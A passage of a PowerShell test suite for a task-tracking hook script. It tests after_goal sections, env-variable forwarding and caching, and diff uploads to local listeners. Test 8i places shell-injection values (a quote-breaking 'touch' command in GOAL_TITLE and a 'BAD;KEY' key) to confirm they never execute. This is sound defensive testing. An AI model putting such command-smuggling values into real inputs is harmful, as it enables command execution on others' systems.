    } | ConvertTo-Json -Depth 5 -Compress)
}

# Shared project with all five hook sections.
$agProj = Join-Path $TmpDir 'after-goal-e2e'
New-Item -ItemType Directory -Path $agProj -Force | Out-Null
Set-Content -Path (Join-Path $agProj '.stride.md') -Value @'
## before_doing
```bash
echo "before_doing_ran"
```

## after_doing
```bash
echo "after_doing_ran"
```

## before_review
```bash
echo "before_review_ran"
```

## after_review
```bash
echo "after_review_ran"
```

## after_goal
```bash
echo "after_goal_ran for $GOAL_IDENTIFIER"
```
'@ -Encoding UTF8

# 8a: after_goal in response + ## after_goal present -> section runs.
$agInputPresent = Build-AfterGoalInput `
    -PrimaryCommand 'curl -X PATCH https://stridelikeaboss.com/api/tasks/99/complete' `
    -HookNames @('after_doing', 'before_review', 'after_review', 'after_goal')
$r = Invoke-HookScript -InputJson $agInputPresent -Phase 'post' -ProjectDir $agProj
Assert-Exit "8a: end-to-end after_goal present exits 0" 0 $r.ExitCode
Assert-Contains "8a: primary before_review ran" "before_review_ran" $r.Stdout
Assert-Contains "8a: after_goal section ran" "after_goal_ran" $r.Stdout
Assert-Contains "8a: structured success JSON for after_goal on stdout" '"hook":"after_goal"' $r.Stdout

# 8b: after_goal in response + ## after_goal section ABSENT -> back-compat
# no-op. Primary hook runs; after_goal silently produces no JSON.
$agProjMissing = Join-Path $TmpDir 'after-goal-e2e-missing'
New-Item -ItemType Directory -Path $agProjMissing -Force | Out-Null
Set-Content -Path (Join-Path $agProjMissing '.stride.md') -Value @'
## before_doing
```bash
echo "before_doing_ran"
```

## after_doing
```bash
echo "after_doing_ran"
```

## before_review
```bash
echo "before_review_ran"
```

## after_review
```bash
echo "after_review_ran"
```
'@ -Encoding UTF8
$r = Invoke-HookScript -InputJson $agInputPresent -Phase 'post' -ProjectDir $agProjMissing
Assert-Exit "8b: end-to-end after_goal-missing-section exits 0 (back-compat)" 0 $r.ExitCode
Assert-Contains "8b: primary before_review still ran" "before_review_ran" $r.Stdout
Assert-NotContains "8b: missing ## after_goal emits no after_goal JSON" '"hook":"after_goal"' $r.Stdout

# 8c: after_goal NOT in response -> behavior unchanged.
$agInputAbsent = Build-AfterGoalInput `
    -PrimaryCommand 'curl -X PATCH https://stridelikeaboss.com/api/tasks/99/complete' `
    -HookNames @('after_doing', 'before_review', 'after_review')
$r = Invoke-HookScript -InputJson $agInputAbsent -Phase 'post' -ProjectDir $agProj
Assert-Exit "8c: end-to-end after_goal-absent exits 0" 0 $r.ExitCode
Assert-Contains "8c: primary before_review ran" "before_review_ran" $r.Stdout
Assert-NotContains "8c: after_goal absent does not execute the section" "after_goal_ran" $r.Stdout

# 8d: after_goal section command exits non-zero -> structured failure JSON
# surfaces on stdout; script exit code stays 0 (primary curl already
# succeeded — agent reads the failure off stdout to forward via PATCH
# /api/tasks/:goal_id/after_goal).
$agProjFail = Join-Path $TmpDir 'after-goal-e2e-fail'
New-Item -ItemType Directory -Path $agProjFail -Force | Out-Null
Set-Content -Path (Join-Path $agProjFail '.stride.md') -Value @'
## before_review
```bash
echo "before_review_ran"
```

## after_review
```bash
echo "after_review_ran"
```

## after_goal
```bash
bash -c 'exit 11'
```
'@ -Encoding UTF8
$r = Invoke-HookScript -InputJson $agInputPresent -Phase 'post' -ProjectDir $agProjFail
Assert-Exit "8d: end-to-end after_goal-failure does not propagate as script exit" 0 $r.ExitCode
Assert-Contains "8d: structured failed JSON references after_goal on stdout" '"hook":"after_goal"' $r.Stdout
Assert-Contains "8d: structured failed JSON has status:failed" '"status":"failed"' $r.Stdout
Assert-Contains "8d: structured failed JSON carries non-zero exit_code" '"exit_code":11' $r.Stdout

# 8d2 (D228): a failing after_goal means `git push origin main` never ran, so
# it must not be silent. Mirrors bash Test Group 24. Manual pwsh execution is
# not a regression guard — these are.
Assert-Contains "8d2 (D228): failure JSON carries the PostToolUse context field" `
    '"hookEventName":"PostToolUse"' $r.Stdout
Assert-Contains "8d2 (D228): the context names the push that did not happen" `
    'git push origin main' $r.Stdout
Assert-Contains "8d2 (D228): the failure is announced loudly on stderr" `
    'AFTER_GOAL UNRESOLVED' $r.Stderr
$agMarkerFail = Join-Path $agProjFail '.stride/after-goal-unresolved'
$agMarkerText = if (Test-Path $agMarkerFail) { (Get-Content $agMarkerFail -Raw) } else { '' }
Assert-Contains "8d2 (D228): a durable marker records the unresolved push" `
    'unresolved=yes' $agMarkerText
Assert-Contains "8d2 (D228): the marker states the push did not land" `
    'pushed=no' $agMarkerText

# 8d3 (D228): the SUCCESS path must stay quiet AND clear a stale marker. A
# channel that fires on healthy goals trains the reader to ignore it, and a
# marker that is only ever written becomes a permanent false positive.
Set-Content -Path (Join-Path $agProjFail '.stride.md') -Value @'
## before_review
```bash
echo "before_review_ran"
```

## after_goal
```bash
echo after_goal_recovered
```
'@ -Encoding UTF8
$r2 = Invoke-HookScript -InputJson $agInputPresent -Phase 'post' -ProjectDir $agProjFail
Assert-NotContains "8d3 (D228): a successful after_goal adds no PostToolUse context" `
    'hookSpecificOutput' $r2.Stdout
Assert-NotContains "8d3 (D228): a successful after_goal prints no UNRESOLVED warning" `
    'AFTER_GOAL UNRESOLVED' $r2.Stderr
if (Test-Path $agMarkerFail) {
    Write-Host "  FAIL: 8d3 (D228): a later successful after_goal should clear the marker" -ForegroundColor Red
    $script:Fail++
} else {
    Write-Host "  PASS: 8d3 (D228): a later successful after_goal clears the marker" -ForegroundColor Green
    $script:Pass++
}

# 8d4 (D228): the OTHER way a section exits 0 — it had nothing to run. An empty
# or absent ## after_goal pushed nothing, so it must not erase a real report.
# 8d3 recovers with a non-empty body and so cannot see this branch; plugin mode
# ships exactly the empty fence, making it the live configuration.
$agProjEmpty = Join-Path $TmpDir 'after-goal-e2e-empty'
New-Item -ItemType Directory -Path $agProjEmpty -Force | Out-Null
Set-Content -Path (Join-Path $agProjEmpty '.stride.md') -Value @'
## before_review
```bash
echo "before_review_ran"
```

## after_goal
```bash
bash -c 'exit 11'
```
'@ -Encoding UTF8
$null = Invoke-HookScript -InputJson $agInputPresent -Phase 'post' -ProjectDir $agProjEmpty
$agMarkerEmpty = Join-Path $agProjEmpty '.stride/after-goal-unresolved'
Set-Content -Path (Join-Path $agProjEmpty '.stride.md') -Value @'
## before_review
```bash
echo "before_review_ran"
```

## after_goal
```bash
```
'@ -Encoding UTF8
$null = Invoke-HookScript -InputJson $agInputPresent -Phase 'post' -ProjectDir $agProjEmpty
if (Test-Path $agMarkerEmpty) {
    Write-Host "  PASS: 8d4 (D228): an EMPTY after_goal does not erase the marker" -ForegroundColor Green
    $script:Pass++
} else {
    Write-Host "  FAIL: 8d4 (D228): an EMPTY after_goal erased the marker, but nothing was pushed" -ForegroundColor Red
    $script:Fail++
}

# 8e: mark_reviewed URL also routes after_goal (parity with /complete).
$agInputMr = Build-AfterGoalInput `
    -PrimaryCommand 'curl -X PATCH https://stridelikeaboss.com/api/tasks/99/mark_reviewed' `
    -HookNames @('after_review', 'after_goal')
$r = Invoke-HookScript -InputJson $agInputMr -Phase 'post' -ProjectDir $agProj
Assert-Exit "8e: end-to-end after_goal on mark_reviewed exits 0" 0 $r.ExitCode
Assert-Contains "8e: mark_reviewed runs after_review" "after_review_ran" $r.Stdout
Assert-Contains "8e: mark_reviewed runs after_goal" "after_goal_ran" $r.Stdout

# --- W1453: server-supplied hook env forwarding (mirrors bash 10f-10k) ---

# Helper: like Build-AfterGoalInput but takes the full inner object so
# fixtures can carry `env` objects on hook entries and `parent_id` in data.
function Build-AfterGoalInputFull {
    param(
        [string]$PrimaryCommand,
        $Inner
    )
    $innerJson = ($Inner | ConvertTo-Json -Depth 8 -Compress)
    return (@{
        tool_input    = @{ command = $PrimaryCommand }
        tool_response = @{ stdout = $innerJson }
    } | ConvertTo-Json -Depth 8 -Compress)
}

# Helper: a fresh project whose ## after_goal section echoes the env vars
# under test (bash -c children inherit the Process-scoped env).
function New-AfterGoalEnvProject {
    param([string]$Suffix)
    $dir = Join-Path $TmpDir "after-goal-env-$Suffix"
    New-Item -ItemType Directory -Path $dir -Force | Out-Null
    Set-Content -Path (Join-Path $dir '.stride.md') -Value @'
## before_review
```bash
echo "gid=[$GOAL_ID] gident=[$GOAL_IDENTIFIER] gtitle=[$GOAL_TITLE] tid=[$TASK_ID] hn=[$HOOK_NAME]" > /dev/null; echo "before_review_ran"
```

## after_review
```bash
echo "after_review_ran"
```

## after_goal
```bash
echo "gid=[$GOAL_ID] gident=[$GOAL_IDENTIFIER] gtitle=[$GOAL_TITLE] tid=[$TASK_ID] hn=[$HOOK_NAME]"
```
'@ -Encoding UTF8
    return $dir
}

# 8f: server-supplied GOAL_* env on the after_goal entry is exported to the
# section and written to the env cache for the follow-up PATCH (D260:
# Set-HookEnv replaces in place for the keys each call writes).
$agEnvProjF = New-AfterGoalEnvProject -Suffix 'supplied'
$agEnvInputF = Build-AfterGoalInputFull `
    -PrimaryCommand 'curl -X PATCH https://stridelikeaboss.com/api/tasks/99/complete' `
    -Inner @{
        data  = @{ id = 99; parent_id = 55 }
        hooks = @(
            @{ name = 'before_review' }
            @{ name = 'after_goal'; env = @{ GOAL_ID = '7'; GOAL_IDENTIFIER = 'G7'; GOAL_TITLE = 'Goal Seven' } }
        )
    }
$r = Invoke-HookScript -InputJson $agEnvInputF -Phase 'post' -ProjectDir $agEnvProjF
Assert-Exit "8f: server-supplied GOAL_* env exits 0" 0 $r.ExitCode
Assert-Contains "8f: section sees server-supplied GOAL_ID" "gid=[7]" $r.Stdout
Assert-Contains "8f: section sees server-supplied GOAL_IDENTIFIER" "gident=[G7]" $r.Stdout
$agEnvCacheF = ''
if (Test-Path (Join-Path $agEnvProjF '.stride-env-cache')) {
    $agEnvCacheF = Get-Content (Join-Path $agEnvProjF '.stride-env-cache') -Raw -Encoding UTF8
}
Assert-Contains "8f: env cache carries GOAL_ID for the follow-up PATCH" "GOAL_ID='7'" $agEnvCacheF
Assert-Contains "8f: env cache carries GOAL_IDENTIFIER" "GOAL_IDENTIFIER='G7'" $agEnvCacheF

# 8g: after_goal entry with NO env object — omitted GOAL_* keys export as
# empty strings (never an error) and GOAL_ID falls back to data.parent_id.
$agEnvProjG = New-AfterGoalEnvProject -Suffix 'fallback'
$agEnvInputG = Build-AfterGoalInputFull `
    -PrimaryCommand 'curl -X PATCH https://stridelikeaboss.com/api/tasks/99/complete' `
    -Inner @{
        data  = @{ id = 99; parent_id = 55 }
        hooks = @(
            @{ name = 'before_review' }
            @{ name = 'after_goal' }
        )
    }
$r = Invoke-HookScript -InputJson $agEnvInputG -Phase 'post' -ProjectDir $agEnvProjG
Assert-Exit "8g: no-env after_goal entry exits 0" 0 $r.ExitCode
Assert-Contains "8g: GOAL_ID falls back to data.parent_id" "gid=[55]" $r.Stdout
Assert-Contains "8g: omitted GOAL_IDENTIFIER exports as empty string" "gident=[]" $r.Stdout
Assert-Contains "8g: omitted GOAL_TITLE exports as empty string" "gtitle=[]" $r.Stdout

# 8g-2: env present but GOAL_ID empty — the fallback also fires.
$agEnvProjG2 = New-AfterGoalEnvProject -Suffix 'fallback-empty'
$agEnvInputG2 = Build-AfterGoalInputFull `
    -PrimaryCommand 'curl -X PATCH https://stridelikeaboss.com/api/tasks/99/complete' `
    -Inner @{
        data  = @{ id = 99; parent_id = 55 }
        hooks = @(
            @{ name = 'before_review' }
            @{ name = 'after_goal'; env = @{ GOAL_ID = ''; GOAL_IDENTIFIER = 'G55' } }
        )
    }
$r = Invoke-HookScript -InputJson $agEnvInputG2 -Phase 'post' -ProjectDir $agEnvProjG2
Assert-Contains "8g-2: empty server GOAL_ID falls back to parent_id" "gid=[55]" $r.Stdout
Assert-Contains "8g-2: supplied GOAL_IDENTIFIER survives the fallback" "gident=[G55]" $r.Stdout

# 8h: precedence — server-supplied keys override stale cached values; keys
# the server does not supply keep their cached values.
$agEnvProjH = New-AfterGoalEnvProject -Suffix 'precedence'
Set-Content -Path (Join-Path $agEnvProjH '.stride-env-cache') -Value 'TASK_ID=42' -Encoding UTF8
$agEnvInputH = Build-AfterGoalInputFull `
    -PrimaryCommand 'curl -X PATCH https://stridelikeaboss.com/api/tasks/99/complete' `
    -Inner @{
        data  = @{ id = 99; parent_id = 55 }
        hooks = @(
            @{ name = 'before_review' }
            @{ name = 'after_goal'; env = @{ GOAL_ID = '7'; TASK_ID = '99' } }
        )
    }
$r = Invoke-HookScript -InputJson $agEnvInputH -Phase 'post' -ProjectDir $agEnvProjH
Assert-Contains "8h: server-supplied TASK_ID overrides the stale cached value" "tid=[99]" $r.Stdout
Assert-Contains "8h: GOAL_ID exported alongside" "gid=[7]" $r.Stdout

$agEnvProjH2 = New-AfterGoalEnvProject -Suffix 'precedence-keep'
Set-Content -Path (Join-Path $agEnvProjH2 '.stride-env-cache') -Value 'TASK_ID=42' -Encoding UTF8
$agEnvInputH2 = Build-AfterGoalInputFull `
    -PrimaryCommand 'curl -X PATCH https://stridelikeaboss.com/api/tasks/99/complete' `
    -Inner @{
        data  = @{ id = 99; parent_id = 55 }
        hooks = @(
            @{ name = 'before_review' }
            @{ name = 'after_goal'; env = @{ GOAL_ID = '7' } }
        )
    }
$r = Invoke-HookScript -InputJson $agEnvInputH2 -Phase 'post' -ProjectDir $agEnvProjH2
Assert-Contains "8h: unsupplied keys keep their cached values" "tid=[42]" $r.Stdout

# 8i: injection safety — a crafted value arrives literally (no shell parsing
# on the export path) and a non-identifier key is dropped, never executed.
$agEnvProjI = New-AfterGoalEnvProject -Suffix 'injection'
$agPwned = Join-Path $TmpDir 'after-goal-env-pwned'
Remove-Item -Force $agPwned -ErrorAction SilentlyContinue
$agEnvInputI = Build-AfterGoalInputFull `
    -PrimaryCommand 'curl -X PATCH https://stridelikeaboss.com/api/tasks/99/complete' `
    -Inner @{
        data  = @{ id = 99; parent_id = 55 }
        hooks = @(
            @{ name = 'before_review' }
            @{ name = 'after_goal'; env = @{ GOAL_ID = '7'; GOAL_TITLE = "x'; touch $agPwned; echo 'y"; 'BAD;KEY' = "touch $agPwned" } }
        )
    }
$r = Invoke-HookScript -InputJson $agEnvInputI -Phase 'post' -ProjectDir $agEnvProjI
Assert-Exit "8i: crafted env values exit 0" 0 $r.ExitCode
if (Test-Path $agPwned) {
    Write-Host "  FAIL: 8i: crafted env value executed a command (pwned file exists)" -ForegroundColor Red
    $script:Fail++
} else {
    Write-Host "  PASS: 8i: crafted env value never executes (no pwned file)" -ForegroundColor Green
    $script:Pass++
}
Assert-Contains "8i: crafted value arrives literally in the section" "gtitle=[x'; touch" $r.Stdout

# 8j: cleanup deferral — when after_goal rides the mark_reviewed response,
# the env cache survives (the agent still needs GOAL_ID for the follow-up
# PATCH); the diff snapshot artifacts are still removed.
$agEnvProjJ = New-AfterGoalEnvProject -Suffix 'cleanup-defer'
Set-Content -Path (Join-Path $agEnvProjJ '.stride-env-cache') -Value 'TASK_ID=42' -Encoding UTF8
Set-Content -Path (Join-Path $agEnvProjJ '.stride-changed-files.json') -Value '[]' -Encoding UTF8
$agEnvInputJ = Build-AfterGoalInputFull `
    -PrimaryCommand 'curl -X PATCH https://stridelikeaboss.com/api/tasks/99/mark_reviewed' `
    -Inner @{
        data  = @{ id = 99; parent_id = 55 }
        hooks = @(
            @{ name = 'after_review' }
            @{ name = 'after_goal'; env = @{ GOAL_ID = '7' } }
        )
    }
$r = Invoke-HookScript -InputJson $agEnvInputJ -Phase 'post' -ProjectDir $agEnvProjJ
Assert-Exit "8j: mark_reviewed with after_goal exits 0" 0 $r.ExitCode
if (Test-Path (Join-Path $agEnvProjJ '.stride-env-cache')) {
    Write-Host "  PASS: 8j: env cache survives mark_reviewed when after_goal rode it" -ForegroundColor Green
    $script:Pass++
} else {
    Write-Host "  FAIL: 8j: env cache should survive for the follow-up after_goal PATCH" -ForegroundColor Red
    $script:Fail++
}
$agEnvCacheJ = ''
if (Test-Path (Join-Path $agEnvProjJ '.stride-env-cache')) {
    $agEnvCacheJ = Get-Content (Join-Path $agEnvProjJ '.stride-env-cache') -Raw -Encoding UTF8
}
Assert-Contains "8j: surviving cache carries GOAL_ID" "GOAL_ID='7'" $agEnvCacheJ
if (Test-Path (Join-Path $agEnvProjJ '.stride-changed-files.json')) {
    Write-Host "  FAIL: 8j: diff snapshot should still be removed on mark_reviewed" -ForegroundColor Red
    $script:Fail++
} else {
    Write-Host "  PASS: 8j: diff snapshot still removed on mark_reviewed" -ForegroundColor Green
    $script:Pass++
}

# 8j-2: mark_reviewed WITHOUT after_goal keeps the existing cleanup.
$agEnvProjJ2 = New-AfterGoalEnvProject -Suffix 'cleanup-normal'
Set-Content -Path (Join-Path $agEnvProjJ2 '.stride-env-cache') -Value 'TASK_ID=42' -Encoding UTF8
$agEnvInputJ2 = Build-AfterGoalInputFull `
    -PrimaryCommand 'curl -X PATCH https://stridelikeaboss.com/api/tasks/99/mark_reviewed' `
    -Inner @{
        data  = @{ id = 99 }
        hooks = @(@{ name = 'after_review' })
    }
$null = Invoke-HookScript -InputJson $agEnvInputJ2 -Phase 'post' -ProjectDir $agEnvProjJ2
if (Test-Path (Join-Path $agEnvProjJ2 '.stride-env-cache')) {
    Write-Host "  FAIL: 8j-2: mark_reviewed without after_goal should still delete the cache" -ForegroundColor Red
    $script:Fail++
} else {
    Write-Host "  PASS: 8j-2: mark_reviewed without after_goal still deletes the cache" -ForegroundColor Green
    $script:Pass++
}

# 8k: HOOK_NAME containment — a server-sent HOOK_NAME is never cached (a
# cached line would misroute later invocations), yet the section observes
# HOOK_NAME=after_goal from the executor's explicit set/restore.
$agEnvProjK = New-AfterGoalEnvProject -Suffix 'hookname'
$agEnvInputK = Build-AfterGoalInputFull `
    -PrimaryCommand 'curl -X PATCH https://stridelikeaboss.com/api/tasks/99/complete' `
    -Inner @{
        data  = @{ id = 99; parent_id = 55 }
        hooks = @(
            @{ name = 'before_review' }
            @{ name = 'after_goal'; env = @{ GOAL_ID = '7'; HOOK_NAME = 'after_goal' } }
        )
    }
$r = Invoke-HookScript -InputJson $agEnvInputK -Phase 'post' -ProjectDir $agEnvProjK
Assert-Contains "8k: section observes HOOK_NAME=after_goal" "hn=[after_goal]" $r.Stdout
$agEnvCacheK = @()
if (Test-Path (Join-Path $agEnvProjK '.stride-env-cache')) {
    $agEnvCacheK = @(Get-Content (Join-Path $agEnvProjK '.stride-env-cache') -Encoding UTF8)
}
if (@($agEnvCacheK | Where-Object { $_ -match '^HOOK_NAME=' }).Count -gt 0) {
    Write-Host "  FAIL: 8k: HOOK_NAME must never be written to the env cache" -ForegroundColor Red
    $script:Fail++
} else {
    Write-Host "  PASS: 8k: HOOK_NAME never written to the env cache" -ForegroundColor Green
    $script:Pass++
}

# 8k2 (D258): record-namespace containment, the same shape as 8k's HOOK_NAME
# containment and mirroring bash 23m2/23m3. Until D258 this port fenced five
# families but not TASK_HEAD_REF, the one that says where a task's window
# CLOSES and so steers commit attribution. This port implements none of that
# attribution subsystem, so an injected key is inert HERE — the case exists so
# the two scripts are pinned to the same client-owned namespace rather than
# drifting until whichever one gets the subsystem next inherits the gap.
# A genuine seeded record must also survive untouched.
$agEnvProjK2 = New-AfterGoalEnvProject -Suffix 'recordns'
Set-Content -Path (Join-Path $agEnvProjK2 '.stride-env-cache') `
    -Value "TASK_HEAD_REF_77=aaaa111genuine" -Encoding UTF8
$agEnvInputK2 = Build-AfterGoalInputFull `
    -PrimaryCommand 'curl -X PATCH https://stridelikeaboss.com/api/tasks/99/complete' `
    -Inner @{
        data  = @{ id = 99; parent_id = 55 }
        hooks = @(
            @{ name = 'before_review' }
            @{ name = 'after_goal'; env = @{
                GOAL_ID           = '7'
                TASK_HEAD_REF_77  = 'ffff999bogus'
                TASK_BASE_REF_77  = 'ffff999bogus'
                TASK_OWNED_77     = 'ffff999bogus'
                TASK_BASE_AT_77   = 'ffff999bogus'
                TASK_NARROWED_77  = 'yes'
                STRIDE_OPEN_WINDOW_MAX_AGE_SECS = '9999999999'
            } }
        )
    }
$null = Invoke-HookScript -InputJson $agEnvInputK2 -Phase 'post' -ProjectDir $agEnvProjK2
$agEnvCacheK2 = ''
if (Test-Path (Join-Path $agEnvProjK2 '.stride-env-cache')) {
    $agEnvCacheK2 = Get-Content (Join-Path $agEnvProjK2 '.stride-env-cache') -Raw -Encoding UTF8
}
if ($agEnvCacheK2 -match 'ffff999bogus' -or $agEnvCacheK2 -match 'STRIDE_OPEN_WINDOW_MAX_AGE_SECS') {
    Write-Host "  FAIL: 8k2 (D258): an injected record-namespace value reached the env cache" -ForegroundColor Red
    $script:Fail++
} else {
    Write-Host "  PASS: 8k2 (D258): no injected record-namespace value reached the env cache" -ForegroundColor Green
    $script:Pass++
}
Assert-Contains "8k2 (D258): the genuine seeded head record is untouched" `
    "TASK_HEAD_REF_77=aaaa111genuine" $agEnvCacheK2
Assert-Contains "8k2 (D258): a legitimate server key on the same env still lands" `
    "GOAL_ID='7'" $agEnvCacheK2

# 8l: env value with an embedded newline reaches the section exactly (the
# process env keeps the raw value; only the line-based cache copy collapses
# it), and omitted keys are defined-but-empty in the section child even
# though .NET deletes empty Process env vars — ${GOAL_IDENTIFIER?unset}
# hard-fails the section if the key were missing.
$agEnvProjL = Join-Path $TmpDir 'after-goal-env-newline'
New-Item -ItemType Directory -Path $agEnvProjL -Force | Out-Null
Set-Content -Path (Join-Path $agEnvProjL '.stride.md') -Value @'
## before_review
```bash
echo "before_review_ran"
```

## after_goal
```bash
echo "gtitle=[$GOAL_TITLE] gident=[${GOAL_IDENTIFIER?unset}]"
```
'@ -Encoding UTF8
$agEnvInputL = Build-AfterGoalInputFull `
    -PrimaryCommand 'curl -X PATCH https://stridelikeaboss.com/api/tasks/99/complete' `
    -Inner @{
        data  = @{ id = 99; parent_id = 55 }
        hooks = @(
            @{ name = 'before_review' }
            @{ name = 'after_goal'; env = @{ GOAL_ID = '7'; GOAL_TITLE = "line1`nline3" } }
        )
    }
$r = Invoke-HookScript -InputJson $agEnvInputL -Phase 'post' -ProjectDir $agEnvProjL
Assert-Exit "8l: embedded-newline env value exits 0" 0 $r.ExitCode
Assert-Contains "8l: newline value's first line reaches the section" "gtitle=[line1" $r.Stdout
Assert-Contains "8l: newline value's last line reaches the section intact" "line3]" $r.Stdout
Assert-Contains "8l: omitted GOAL_IDENTIFIER is defined-but-empty in the section child" "gident=[]" $r.Stdout
Assert-NotContains "8l: after_goal section must not fail on the newline fixture" '"status":"failed"' $r.Stdout
$agEnvCacheL = ''
if (Test-Path (Join-Path $agEnvProjL '.stride-env-cache')) {
    $agEnvCacheL = Get-Content (Join-Path $agEnvProjL '.stride-env-cache') -Raw -Encoding UTF8
}
Assert-Contains "8l: cached copy collapses the newline to a space" "GOAL_TITLE='line1 line3'" $agEnvCacheL

# ============================================================
# Test Group 9: early upload + before_review self-heal (W1095,
# mirrors test-stride-hook.sh Groups 12 and 13)
# ============================================================
# (W2105) THIS GROUP'S REDUCTION NOTE IS NOW OBSOLETE and is corrected rather
# than deleted, because acceptance criterion 3 of W2105 exists to force exactly
# this re-read. It said: "the ps1 script has no capture step - the pre-seeded
# on-disk snapshot is the source of truth - so the bash capture-content
# assertions translate to upload-ordering and state-file assertions here."
# W2100 built the capture step, and Group 21 mirrors sh Group 7's
# capture-content assertions directly. So sh Groups 12 and 13 are no longer
# REDUCED into this group: their capture half lives in Group 21 and their
# upload/self-heal half lives here, which is a split rather than a loss. What
# remains true is the mechanical part below. Unreachable-URL cases use
# 127.0.0.1:1 so an attempted PUT deterministically records '000' and warns
# on stderr; listener cases serve multiple requests because after_doing now
# PUTs twice (early + refresh).
Write-Host ""
Write-Host "=== Test Group 9: early upload + self-heal (W1095) ==="

# Listener that serves $Count requests, appending one compressed JSON record
# per request to $Fixture (JSON-lines).
function Start-PutListener {
    param([int]$Port, [string]$Fixture, [int]$Count = 1)
    Start-Job -ArgumentList $Port, $Fixture, $Count -ScriptBlock {
        param($Port, $Fixture, $Count)
        $l = [System.Net.HttpListener]::new()
        $l.Prefixes.Add("http://localhost:$Port/")
        try {
            $l.Start()
            for ($i = 0; $i -lt $Count; $i++) {
                $ctx = $l.GetContext()
                $req = $ctx.Request
                $reader = [System.IO.StreamReader]::new($req.InputStream)
                $body = $reader.ReadToEnd()
                @{ Method = $req.HttpMethod; Path = $req.Url.AbsolutePath; Auth = $req.Headers['Authorization']; Body = $body } |
                    ConvertTo-Json -Compress | Add-Content -Path $Fixture -Encoding UTF8
                $ctx.Response.StatusCode = 200
                $ctx.Response.OutputStream.Close()
            }
        } catch {
            # Listener tear-down errors are ignored.
        } finally {
            if ($l.IsListening) { $l.Stop() }
        }
    }
}

function New-SelfHealProject {
    param([string]$Name, [string]$StrideMd)
    $dir = Join-Path $TmpDir $Name
    New-Item -ItemType Directory -Path $dir -Force | Out-Null
    Set-Content -Path (Join-Path $dir '.stride.md') -Value $StrideMd -Encoding UTF8
    Set-Content -Path (Join-Path $dir '.stride-changed-files.json') `
        -Value '[{"path":"foo.txt","diff":"unified patch body"}]' -Encoding UTF8
    Set-Content -Path (Join-Path $dir '.stride-env-cache') `
        -Value "TASK_ID=99`nTASK_BASE_REF=abc" -Encoding UTF8
    return $dir
}

$shUnreachableCmd = 'curl -X PATCH http://127.0.0.1:1/api/tasks/99/complete -H "Authorization: Bearer tok"'
$shUnreachableJson = @{ tool_input = @{ command = $shUnreachableCmd } } | ConvertTo-Json -Compress

# 9a: early-upload ordering — the FIRST section command finds the upload
# state (written by the early PUT attempt) already on disk.
$shProjA = New-SelfHealProject -Name 'sh-early-order' -StrideMd @'
## after_doing
```bash
cp .stride-diff-upload-state early-state.txt
```
'@
$r = Invoke-HookScript -InputJson $shUnreachableJson -Phase 'pre' -ProjectDir $shProjA
Assert-Exit "9a: after_doing section succeeds with early upload attempt" 0 $r.ExitCode
$earlyState = Get-Content -Raw -Path (Join-Path $shProjA 'early-state.txt') -ErrorAction SilentlyContinue
if ($earlyState -and $earlyState.Contains('task_id=99')) {
    Write-Host "  PASS: 9a: upload state existed BEFORE the first section command ran" -ForegroundColor Green
    $script:PASS++
} else {
    Write-Host "  FAIL: 9a: first section command did not find the upload state: $earlyState" -ForegroundColor Red
    $script:FAIL++
}
Assert-NotContains "9a: early upload emits nothing on stdout" "task_id" $r.Stdout
Assert-Contains "9a: structured success JSON still on stdout" '"status":"success"' $r.Stdout

# 9b: GLOBAL HookName gate — running the after_goal SECTION while the
# primary hook is after_review must attempt no upload (no stderr warning),
# exactly as in bash test 12c. The unreachable URL would warn if the gate
# were broken.
$shProjB = New-SelfHealProject -Name 'sh-gate' -StrideMd @'
## after_review
```bash
echo "after_review_ran"
```

## after_goal
```bash
echo "after_goal_ran"
```
'@
$shGateResponse = '{"data":{"id":99},"hooks":[{"name":"after_goal"}]}'
$shGateJson = @{
    tool_input = @{ command = 'curl -X PATCH http://127.0.0.1:1/api/tasks/99/mark_reviewed -H "Authorization: Bearer tok"' }
    tool_response = $shGateResponse
} | ConvertTo-Json -Compress
$r = Invoke-HookScript -InputJson $shGateJson -Phase 'post' -ProjectDir $shProjB
Assert-Exit "9b: mark_reviewed with after_goal exits 0" 0 $r.ExitCode
Assert-Contains "9b: after_goal section ran" "after_goal_ran" $r.Stdout
Assert-NotContains "9b: no upload attempted when HookName is not after_doing" "changed_files upload failed" $r.Stderr

# 9c: failing section command — structured failed JSON and exit 2 are
# preserved, with the early upload attempt already recorded (mirrors 12d).
$shProjC = New-SelfHealProject -Name 'sh-failed-gate' -StrideMd @'
## after_doing
```bash
bash -c 'exit 7'
```
'@
$r = Invoke-HookScript -InputJson $shUnreachableJson -Phase 'pre' -ProjectDir $shProjC
Assert-Exit "9c: failing after_doing command still returns 2" 2 $r.ExitCode
Assert-Contains "9c: structured failed JSON emitted" '"status":"failed"' $r.Stdout
Assert-Contains "9c: failed JSON carries exit_code 7" '"exit_code":7' $r.Stdout
$stateC = Get-Content -Raw -Path (Join-Path $shProjC '.stride-diff-upload-state') -ErrorAction SilentlyContinue
if ($stateC -and $stateC.Contains('task_id=99') -and $stateC.Contains('http_code=000')) {
    Write-Host "  PASS: 9c: early upload state survives a failed quality gate" -ForegroundColor Green
    $script:PASS++
} else {
    Write-Host "  FAIL: 9c: state missing or wrong after failed gate: $stateC" -ForegroundColor Red
    $script:FAIL++
}

# 9d: state file records the real HTTP code, carries no credentials, and
# after_doing PUTs exactly twice (early + refresh) — mirrors 13a/13b and
# the bash 8a two-PUT assertion.
$shProjD = New-SelfHealProject -Name 'sh-state-2xx' -StrideMd @'
## after_doing
```bash
echo "ran"
```
'@
$shPortD = 18890
$shFixtureD = Join-Path $TmpDir 'sh-fixture-d.jsonl'
if (Test-Path $shFixtureD) { Remove-Item -Force $shFixtureD }
$shJobD = Start-PutListener -Port $shPortD -Fixture $shFixtureD -Count 2
try {
    $null = Wait-ForListener -Port $shPortD
    $shJsonD = @{ tool_input = @{ command = "curl -X PATCH http://localhost:$shPortD/api/tasks/99/complete -H `"Authorization: Bearer tok`"" } } | ConvertTo-Json -Compress
    $r = Invoke-HookScript -InputJson $shJsonD -Phase 'pre' -ProjectDir $shProjD
    Assert-Exit "9d: after_doing with listener exits 0" 0 $r.ExitCode
    Wait-Job $shJobD -Timeout 8 | Out-Null
    Remove-Job $shJobD -Force -ErrorAction SilentlyContinue
    $putCount = 0
    if (Test-Path $shFixtureD) { $putCount = @(Get-Content $shFixtureD).Count }
    Assert-Eq "9d: early upload + refresh make exactly two PUT calls" "2" "$putCount"
    $stateD = Get-Content -Raw -Path (Join-Path $shProjD '.stride-diff-upload-state') -ErrorAction SilentlyContinue
    Assert-Contains "9d: state records the task id" "task_id=99" $stateD
    Assert-Contains "9d: state records the 2xx outcome" "http_code=200" $stateD
    if ($stateD -and ($stateD -match 'Bearer|https?://')) {
